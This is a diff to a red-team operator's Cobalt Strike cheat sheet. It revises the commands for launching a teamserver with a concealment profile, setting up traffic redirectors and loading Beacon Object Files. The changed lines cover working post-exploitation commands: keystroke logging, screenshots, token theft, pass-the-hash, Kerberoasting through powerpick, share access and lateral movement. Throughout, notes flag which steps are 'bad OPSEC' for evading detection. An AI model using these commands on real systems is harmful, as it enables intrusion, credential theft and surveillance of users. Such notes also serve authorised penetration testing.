@@ -129,11 +129,11 @@ https://blog.zsec.uk/cobalt-strike-profiles/
 Start a new screen session: screen -S <name>
 
 Parameters in <> are mandatory, those in [] are optional
-./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
-./teamserver 192.168.1.5 password123 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
+sudo ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
+sudo ./teamserver 192.168.1.5 password123 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
 
 When the team server starts, it will display the SHA256 hash of the SSL cert. 
-Share this hash with teammates and validate when connecting.
+Share this hash with teammates and have them validate the hash when connecting.
 
 - Remove old data and Beacons (optional)
 Stop the team server.
@@ -168,8 +168,10 @@ Redirector 1 - domain1 (primary)
 Redirector 2 - domain2 (backup)
 Redirector 3 - DNS (long haul)
 
-- Install socat on each instance
-Forwards all traffic on these ports. This is not OPSEC friendly.
+- Use Apache mod_rewrite
+
+- Use socat (not OPSEC friendly)
+Forwards all traffic on these ports.
 sudo -i
 apt-get install -y socat
 screen -S <name>                                            Start a new screen session
@@ -292,10 +294,24 @@ https://github.com/matterpreter/DefenderCheck
 https://github.com/rasta-mouse/ThreatCheck
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Beacon Object File (BOF)
+
+A compiled C program that executes within a Beacon.
+It can call Win32 and Beacon APIs without spawning and injecting into a new process.
+It is used to run small commands for a short time.
+
+Cobalt Strike > Script Manger > Load
+/opt/BOFs/anthemtotheego-inlineExecute-assembly/inlineExecuteAssembly/inlineExecute-Assembly.cna
+/opt/BOFs/outflanknl-c2-tool-collection/BOF/Kerberoast.cna
+/opt/BOFs/outflanknl-helpcolor/HelpColor.cna
+/opt/BOFs/trustedsec-remote-ops/Remote/Remote.cna
+/opt/BOFs/trustedsec-sa/SA/SA.cna
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Interact with a Beacon
 
 Right-click on a Beacon > Interact
-help                                                 Help menu
+helpx                                                OPSEC color coded commands
 help <command>                                       Get more help on a particular command
 ctrl +/-                                             Increase or decrease the font size
 ctrl k                                               Clear the window
@@ -304,15 +320,6 @@ By default, Beacon will check in every 60 seconds.
 sleep 10                                             Set Beacon sleep time to 10 seconds
 sleep 20 10                                          Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
 sleep 0                                              Make a Beacon interactive
-
-- Beacon Object File (BOF)
-A compiled C program that executes within a Beacon.
-It can call Win32 and Beacon APIs without spawning and injecting into a new process.
-It is used to run small commands for a short time.
-
-Cobalt Strike > Script Manger > Load
-/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
-helpx                                                OPSEC color coded commands
 
 - Jobs
 jobs                                                 List long-running post-exploitation tasks
@@ -331,50 +338,35 @@ Right-click on the Beacon > Session > Remove         Remove dead Beacon
 
 # Situational awareness
 
-Cobalt Strike > Script Manger > Load
-/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-
-tasklist                                             List currently running processes
-ps                                                   Show process list
-netstat                                              List listening and connected IPv4 UDP and TCP connections
-windowslist                                          List available windows
-netuse_list                                          List local bound connections
-ipconfig                                             Runs and internal ipconfig commend
-netuser <username> <domain>                          List user info
-
-listdns                                              List DNS cache entries
-routeprint                                           Print IPv4 routes on the machine
-userenum                                             List computer user accounts
-netLocalGroupList                                    List groups in this server
-netLocalGroupListMembers <group>                     List the members in the specified group in this server
-netsession                                           List sessions on server
-netshares                                            List shares on local local or remote computer
 pwd                                                  Print current directory
-dir                                                  List a target directory
-driversigs                                           Check drivers for known EDR vendor names
-drives                                               List drives on target
-history                                              Show the command history of the Beacon
+dir                                                  BOF - List files in a directory
+ps                                                   Show process list
+tasklist                                             BOF - List running processes
+ipconfig                                             BOF - Runs and internal ipconfig commend
+netstat                                              BOF - TCP and UDP IPv4 listing ports
+arp                                                  BOF - List ARP table
+netuse_list                                          BOF - List all bound share resources or info about target local resource
+netshares                                            BOF - List shares on the local or remote computer
+windowlist                                           BOF - List visible windows in the current user session
+driversigs                                           BOF - Enumerate installed services Imagepaths to check the signing cert against known AV/EDR vendors
 
-arp                                                  Runs an internal ARP command
+userenum                                             List computer user accounts
+netloggedon                                          BOF - Return users logged on the local or remote computer
+netuser <user> <domain>                              BOF - Get info about specific user. Pull from domain if a domainname is specified
+netLocalGroupListMembers <group>                     BOF - List local groups from the local or specified computer
+
 domainenum                                           List user accounts in the current domain
-netview                                              List local workstations and servers
-net domain                                           Show the current domain
-net domain_controllers                               Show domain controllers
-net computers                                        Show doamin computers (this can take a couple of min, be patient)
-
 View > Targets                                       Discovered targets will populate
 
-ps                                                   Show process list. Look for another user that is logged in
+Right-click on the Beacon > Explore > File Browser
+Right-click on a file > Download
+View > Downloads > select a file > Sync Files        The downloaded file is saved to your local VM
 
 screenshot <PID> x64                                 Take a single screenshot (look for svchost running on the current user)
                                                      View > Screenshots
 
 keylogger <PID> x64                                  Start a keystroke logger (look for svchost running on the current user)
                                                      View > Keystrokes
-
-Right-click on the Beacon > Explore > File Browser
-Right-click on a file > Download
-View > Downloads > select a file > Sync Files        The downloaded file is saved to your local VM
 
 portscan <target range> <ports> none 255             Scan a network for open services
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -457,10 +449,8 @@ sent to the target. You cannot double-hop and execute any additional network con
 
 ps                                                   Show process list.
 steal_token <PID>                                    Use if someone else logged in
-inject <PID> <x86|x64> <listener>                    Bad OPSEC, use a BOF
 make_token <domain\user> <password>                  Plaintext creds preference
 pth <domain\user> <hash>
-spawnas <domain\user> <password> <listener>          Bad OPSEC, use a BOF
 Use Rubeus to request/apply a new ticket
 kerberos_ticket_use (with an existing ticket)
 
@@ -477,10 +467,6 @@ powerpick Get-DomainUser <user from above>; "done"   Show groups a user belongs 
 powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"   Show domain computers
 powerpick Get-NetLocalGroupMember <FQDN*>; "done"    Show users in the local administrator group on a remote computer (* each computer above)
 dir \\<FQDN>\C$\                                     BOF - Check to see if you have access to a remote computer (include the trailing backslash)
-
-If you have access, establish a new Beacon on that host
-jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <listener>   Bad OPSEC, use a BOF
-Privesc and dump creds
 
 powerpick Get-DomainUser-SPN -Properties samaccountname, serviceprincipalnaame; "done"
 powerpick Invoke-Kerberoast <samaccountname> | fl; "done"
